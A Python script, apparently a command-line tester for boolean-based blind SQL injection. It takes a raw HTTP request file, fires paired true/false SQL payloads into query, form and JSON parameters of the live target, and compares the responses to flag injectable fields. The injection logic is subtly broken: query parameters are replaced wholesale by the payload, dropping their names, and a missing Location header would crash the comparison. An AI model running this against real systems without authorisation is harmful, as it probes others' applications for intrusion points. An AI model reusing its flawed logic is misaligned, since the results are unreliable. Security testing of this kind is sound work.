import argparse
import requests
import json
from urllib.parse import urlparse, parse_qs, urljoin
from termcolor import colored  # For colorful output

# Database-specific payloads for Boolean-based blind SQL injection
PAYLOADS = {
    "generic": [
        ("' AND 1=1", "' AND 1=2"),
        ("' AND 1=1--", "' AND 1=2--"),  # Basic boolean-based SQLi (generic)
        ("' OR 1=1", "' OR 1=2"),
        ("' OR 1=1--", "' OR 1=2--"),  # OR-based (generic)
        ("' AND 1=1 LIMIT 1", "' AND 1=1 LIMIT 2"),
        ("' AND 1=1 LIMIT 1--", "' AND 1=1 LIMIT 2--"),  # LIMIT-based condition
    ]
}

# Function to send the HTTP request with the injected payload
def send_request(url, headers, data, json_data, injection_point, payload, method):
    try:
        # Inject the payload into the request
        if data:
            data[injection_point] = payload
        elif json_data:
            json_data[injection_point] = payload
        else:
            url = url.replace(injection_point, payload)

        # Send the request with no redirects
        if method.upper() == "GET":
            response = requests.get(url, headers=headers, allow_redirects=False)
        elif method.upper() == "POST":
            response = requests.post(url, headers=headers, data=data, json=json_data, allow_redirects=False)
        elif method.upper() == "PUT":
            response = requests.put(url, headers=headers, data=data, json=json_data, allow_redirects=False)
        elif method.upper() == "DELETE":
            response = requests.delete(url, headers=headers, data=data, json=json_data, allow_redirects=False)
        elif method.upper() == "PATCH":
            response = requests.patch(url, headers=headers, data=data, json=json_data, allow_redirects=False)
        else:
            print(colored(f"Unsupported HTTP method: {method}", "red"))
            return None

        return response

    except Exception as e:
        print(colored(f"Error: {e}", "red"))
        return None

# Function to extract parameters from the raw request
def extract_parameters(raw_request):
    lines = raw_request.splitlines()
    method = lines[0].split()[0]
    url_path = lines[0].split()[1]
    headers = {}
    data = None
    json_data = None

    # Extract headers
    for line in lines[1:]:
        if not line.strip():
            break
        if ": " in line:
            key, value = line.split(": ", 1)
            headers[key] = value

    # Extract body (if any)
    body = raw_request.split("\n\n")[-1]
    if body:
        if "application/json" in headers.get("Content-Type", ""):
            json_data = json.loads(body)
        else:
            data = {}
            for pair in body.split("&"):
                key, value = pair.split("=")
                data[key] = value

    # Construct the full URL
    if url_path.startswith(("http://", "https://")):
        url = url_path  # Full URL already provided
    else:
        # Use the Host header to construct the full URL
        host = headers.get("Host", "")
        if not host:
            raise ValueError("Host header is missing in the raw request.")
        url = urljoin(f"https://{host}", url_path)

    # Extract query parameters from the URL
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    return method, url, headers, data, json_data, query_params

# Function to compare responses for true and false conditions
def compare_responses(true_response, false_response):
    if true_response is None or false_response is None:
        return False

    # Check if the response codes are in the 3xx range (redirection)
    if true_response.status_code in range(300, 400) and false_response.status_code in range(300, 400):
        # Fetch the Location headers
        true_location = true_response.headers.get('Location')
        false_location = false_response.headers.get('Location')

        print(colored(f"\nTrue Response: {true_response.status_code} - Location: {true_location}", "green"))
        print(colored(f"False Response: {false_response.status_code} - Location: {false_location}", "red"))

        if len(true_location) != len(false_location):
            print(colored("[+] Vulnerability Detected: The location headers are different!", "yellow"))
            print(f"True Location: {true_location}")
            print(f"False Location: {false_location}")
            return True
        else:
            print(colored("[-] No Difference in Location Headers.", "blue"))
            return False

    # Compare status codes if not 3xx (redirection)
    if true_response.status_code != false_response.status_code:
        print(colored(f"Status Code Difference: {true_response.status_code} vs {false_response.status_code}", "yellow"))
        return True

    # Compare response content length (for non-redirection responses)
    if len(true_response.content) != len(false_response.content):
        print(colored(f"Content Length Difference: {len(true_response.content)} vs {len(false_response.content)}", "yellow"))
        return True

    # Compare response content if the lengths are the same
    if true_response.content != false_response.content:
        print(colored("Content Difference Detected.", "yellow"))
        return True

    return False

# Main function
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Boolean-Based Blind SQL Injection Tester")
    parser.add_argument("-r", "--request", required=True, help="Path to the raw HTTP request file")
    parser.add_argument("-d", "--database", choices=PAYLOADS.keys(), help="Target database type (optional)")
    args = parser.parse_args()

    # Read the raw HTTP request from the file
    with open(args.request, "r") as file:
        raw_request = file.read()

    # Extract parameters from the raw request
    try:
        method, url, headers, data, json_data, query_params = extract_parameters(raw_request)
    except ValueError as e:
        print(colored(f"Error: {e}", "red"))
        return

    # Determine which databases to test
    databases_to_test = [args.database] if args.database else PAYLOADS.keys()

    # Flag to detect SQL injection vulnerability
    vulnerability_detected = False

    # Test each parameter for Boolean-based blind SQL injection
    for database in databases_to_test:
        print(colored(f"\n[*] Testing for Boolean-based blind SQL injection (Database: {database})", "cyan"))

        # Test query parameters
        for param, values in query_params.items():
            for value in values:
                injection_point = f"{param}={value}"
                print(colored(f"[*] Testing query parameter: {injection_point}", "magenta"))
                for true_payload, false_payload in PAYLOADS[database]:
                    print(colored(f"[*] Testing true payload: {true_payload}", "green"))
                    true_response = send_request(url, headers, None, None, injection_point, true_payload, method)
                    print(colored(f"[*] Testing false payload: {false_payload}", "red"))
                    false_response = send_request(url, headers, None, None, injection_point, false_payload, method)

                    if compare_responses(true_response, false_response):
                        print(colored(f"[+] Potential Boolean-based blind SQL injection vulnerability detected in query parameter: {injection_point} (Database: {database})", "yellow"))
                        vulnerability_detected = True
                        break

            if vulnerability_detected:
                break
        if vulnerability_detected:
            break

        # Test POST/PUT/PATCH/DELETE data parameters
        if data and not vulnerability_detected:
            for param, value in data.items():
                injection_point = param
                print(colored(f"[*] Testing data parameter: {injection_point}", "magenta"))
                for true_payload, false_payload in PAYLOADS[database]:
                    print(colored(f"[*] Testing true payload: {true_payload}", "green"))
                    true_response = send_request(url, headers, data, None, injection_point, true_payload, method)
                    print(colored(f"[*] Testing false payload: {false_payload}", "red"))
                    false_response = send_request(url, headers, data, None, injection_point, false_payload, method)

                    if compare_responses(true_response, false_response):
                        print(colored(f"[+] Potential Boolean-based blind SQL injection vulnerability detected in data parameter: {injection_point} (Database: {database})", "yellow"))
                        vulnerability_detected = True
                        break
                if vulnerability_detected:
                    break

        if vulnerability_detected:
            break

        # Test JSON data parameters
        if json_data and not vulnerability_detected:
            for param, value in json_data.items():
                injection_point = param
                print(colored(f"[*] Testing JSON parameter: {injection_point}", "magenta"))
                for true_payload, false_payload in PAYLOADS[database]:
                    print(colored(f"[*] Testing true payload: {true_payload}", "green"))
                    true_response = send_request(url, headers, None, json_data, injection_point, true_payload, method)
                    print(colored(f"[*] Testing false payload: {false_payload}", "red"))
                    false_response = send_request(url, headers, None, json_data, injection_point, false_payload, method)

                    if compare_responses(true_response, false_response):
                        print(colored(f"[+] Potential Boolean-based blind SQL injection vulnerability detected in JSON parameter: {injection_point} (Database: {database})", "yellow"))
                        vulnerability_detected = True
                        break
                if vulnerability_detected:
                    break

        if vulnerability_detected:
            break

if __name__ == "__main__":
    main()
